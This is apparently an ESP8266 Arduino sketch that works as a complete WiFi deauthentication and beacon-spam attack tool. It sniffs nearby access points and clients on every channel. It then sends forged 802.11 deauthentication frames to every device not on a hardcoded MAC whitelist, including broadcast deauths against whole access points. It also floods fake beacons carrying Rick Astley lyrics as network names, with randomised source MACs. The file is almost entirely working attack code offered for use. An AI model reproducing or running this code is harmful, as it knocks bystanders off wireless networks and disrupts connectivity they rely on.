// Expose Espressif SDK functionality - wrapped in ifdef so that it still
// compiles on other platforms
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>

#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

// Put Your devices here, system will skip them on deauth
#define WHITELIST_LENGTH 2
uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 }, {  0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF } };

// Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
// If AP is whitelisted, all its clients become automatically whitelisted
//#define WHITELIST_STATION

// Channel to perform deauth
uint8_t channel = 0;

// Packet buffer
uint8_t packet_buffer[64];

// DeAuth template
uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};

uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };

struct beaconinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};

struct clientinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t ap[ETH_MAC_LEN];
  int channel;
  int err;
  signed rssi;
  uint16_t seq_n;
};

beaconinfo aps_known[MAX_APS_TRACKED];                    // Array to save MACs of known APs
int aps_known_count = 0;                                  // Number of known APs
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];            // Array to save MACs of known CLIENTs
int clients_known_count = 0;                              // Number of known CLIENTs

bool friendly_device_found = false;
uint8_t *address_to_check;

struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
{
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}

struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel)
{
  struct clientinfo ci;
  ci.channel = channel;
  ci.err = 0;
  ci.rssi = rssi;
  int pos = 36;
  uint8_t *bssid;
  uint8_t *station;
  uint8_t *ap;
  uint8_t ds;

  ds = frame[1] & 3;    //Set first 6 bits to 0
  switch (ds) {
    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
    case 0:
      bssid = frame + 16;
      station = frame + 10;
      ap = frame + 4;
      break;
    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
    case 1:
      bssid = frame + 4;
      station = frame + 10;
      ap = frame + 16;
      break;
    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
    case 2:
      bssid = frame + 10;
      // hack - don't know why it works like this...
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
        ap = frame + 4;
      } else {
        station = frame + 4;
        ap = frame + 16;
      }
      break;
    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
    case 3:
      bssid = frame + 10;
      station = frame + 4;
      ap = frame + 4;
      break;
  }

  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.bssid, bssid, ETH_MAC_LEN);
  memcpy(ci.ap, ap, ETH_MAC_LEN);

  ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

  return ci;
}

int register_beacon(beaconinfo beacon)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < aps_known_count; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
      known = 1;
      break;
    }   // AP known => Set known flag
  }
  if (! known)  // AP is NEW, copy MAC to array and return it
  {
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;

    if ((unsigned int) aps_known_count >=
        sizeof (aps_known) / sizeof (aps_known[0]) ) {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}

int register_client(clientinfo ci)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < clients_known_count; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  if (! known)
  {
    memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
    clients_known_count++;

    if ((unsigned int) clients_known_count >=
        sizeof (clients_known) / sizeof (clients_known[0]) ) {
      Serial.printf("exceeded max clients_known\n");
      clients_known_count = 0;
    }
  }
  return known;
}

void print_beacon(beaconinfo beacon)
{
  if (beacon.err != 0) {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } else {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

void print_client(clientinfo ci)
{
  int u = 0;
  int known = 0;   // Clear known flag
  if (ci.err != 0) {
  } else {
    Serial.printf("CLIENT: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" works with: ");
    for (u = 0; u < aps_known_count; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;
        break;
      }   // AP known => Set known flag
    }
    if (! known)  {
      Serial.printf("%22s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    }

    Serial.printf("%5s", " ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
    Serial.printf("%5s", " ");

    if (! known) {
      Serial.printf("   %3d", ci.channel);
    } else {
      Serial.printf("   %3d", aps_known[u].channel);
    }
    Serial.printf("   %4d\r\n", ci.rssi);
  }
}

/* ==============================================
   Promiscous callback structures, see ESP manual
   ============================================== */

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct LenSeq {
  uint16_t length;
  uint16_t seq;
  uint8_t  address3[6];
};

struct sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};

struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};


/* Creates a packet.

   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;

   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
{
  int i = 0;

  memcpy(buf, template_da, 26);
  // Destination
  memcpy(buf + 4, c, ETH_MAC_LEN);
  // Sender
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  // BSS
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  // Seq_n
  buf[22] = seq % 0xFF;
  buf[23] = seq / 0xFF;

  return 26;
}

/* Sends deauth packets. */
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
{
  uint8_t i = 0;
  uint16_t sz = 0;
  for (i = 0; i < 0x10; i++) {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
  }
}

void promisc_cb(uint8_t *buf, uint16_t len)
{
  int i = 0;
  uint16_t seq_n_new = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (register_beacon(beacon) == 0) {
      print_beacon(beacon);
      nothing_new = 0;
    }
  } else {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    //Is data or QOS?
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
        if (register_client(ci) == 0) {
          print_client(ci);
          nothing_new = 0;
        }
      }
    }
  }
}

bool check_whitelist(uint8_t *macAdress) {
  unsigned int i = 0;
  for (i = 0; i < WHITELIST_LENGTH; i++) {
    if (! memcmp(macAdress, whitelist[i], ETH_MAC_LEN)) return true;
  }
  return false;
}

void setup() {
  Serial.begin(115200);
  Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());

  // Promiscuous works only with station mode
  wifi_set_opmode(STATION_MODE);

  // Set up promiscuous callback
  wifi_set_channel(1);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
}

void loop() {
  while (true) {
    channel = 1;
    wifi_set_channel(channel);
    while (true) {
      nothing_new++;
      if (nothing_new > 200) {
        nothing_new = 0;

        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(0);
        wifi_promiscuous_enable(1);
        for (int ua = 0; ua < aps_known_count; ua++) {
          if (aps_known[ua].channel == channel) {
            for (int uc = 0; uc < clients_known_count; uc++) {
              if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
#ifdef WHITELIST_STATION
                address_to_check = clients_known[uc].station;
#else
                address_to_check = clients_known[uc].ap;
#endif
                if (check_whitelist(address_to_check)) {
                  friendly_device_found = true;
                  Serial.print("Whitelisted -->");
                  print_client(clients_known[uc]);
                } else {
                  Serial.print("DeAuth to ---->");
                  print_client(clients_known[uc]);
                  deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                }
                break;
              }
            }
            if (!friendly_device_found) deauth(broadcast2, aps_known[ua].bssid, 128);
            friendly_device_found = false;
          }
        }
        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(promisc_cb);
        wifi_promiscuous_enable(1);

        channel++;
        if (channel == 15) break;
        wifi_set_channel(channel);
      }
      delay(1);

      if ((Serial.available() > 0) && (Serial.read() == '\n')) {
        Serial.println("\n-------------------------------------------------------------------------\n");
        for (int u = 0; u < aps_known_count; u++) print_beacon(aps_known[u]);
        for (int u = 0; u < clients_known_count; u++) print_client(clients_known[u]);
        Serial.println("\n-------------------------------------------------------------------------\n");
      }
      RickRoll();
    }
  }
}

void sendBeacon(char* ssid) {
  // Randomize channel //
  byte channel = random(1, 12);
  wifi_set_channel(channel);

  uint8_t packet[128] = { 0x80, 0x00, //Frame Control
                          0x00, 0x00, //Duration
                          /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address
                          /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
                          /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
                          /*22*/  0xc0, 0x6c, //Seq-ctl
                          //Frame body starts here
                          /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
                          /*32*/  0xFF, 0x00, //Beacon interval
                          /*34*/  0x01, 0x04, //Capability info
                          /* SSID */
                          /*36*/  0x00
                        };

  int ssidLen = strlen(ssid);
  packet[37] = ssidLen;

  for (int i = 0; i < ssidLen; i++) {
    packet[38 + i] = ssid[i];
  }

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                          0x03, 0x01, 0x04 /*DSSS (Current Channel)*/
                         };

  for (int i = 0; i < 12; i++) {
    packet[38 + ssidLen + i] = postSSID[i];
  }

  packet[50 + ssidLen] = channel;

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int packetSize = 51 + ssidLen;

  wifi_send_pkt_freedom(packet, packetSize, 0);
  wifi_send_pkt_freedom(packet, packetSize, 0);
  wifi_send_pkt_freedom(packet, packetSize, 0);
  delay(1);
}

void RickRoll() {
  sendBeacon("never gonna give you up");
  sendBeacon("never gonna let you down");
  sendBeacon("never gonna run around");
  sendBeacon("and desert you");
  sendBeacon("never gonna make you cry");
  sendBeacon("never gonna saaaay goodbye");
  sendBeacon("never gonna tell a liiiie");
  sendBeacon("and hurt you");
  sendBeacon("we've known each other");
  sendBeacon("for so long");
  sendBeacon("your heart's been aching");
  sendBeacon("but you're too shy to say it");
  sendBeacon("inside we both know what's been");
  sendBeacon("going on");
  sendBeacon("you know the rules");
  sendBeacon("and you're gonna play it");
  sendBeacon("aaaaaand if you ask me how I'm feeling");
  sendBeacon("gotta make you");
  sendBeacon("understand");
}
